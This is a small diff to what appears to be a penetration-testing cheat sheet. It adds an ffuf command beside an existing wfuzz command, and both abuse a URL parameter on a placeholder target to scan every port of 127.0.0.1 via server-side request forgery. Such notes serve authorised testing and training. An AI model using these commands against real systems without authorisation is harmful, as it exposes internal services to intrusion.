@@ -30,9 +30,13 @@
 
 # Check for internal services on a machine via SSRF
 
-## WFUZZ
+Wfuzz
 
     wfuzz -c -z range,1-65535 http://TARGET_IP/url.php?path=127.0.0.1:FUZZ
+
+Ffuf
+
+    ffuf -u 'http://TARGET_IP/preview.php?url=http://127.0.0.1:FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0
 
 ## Burpsuite
 
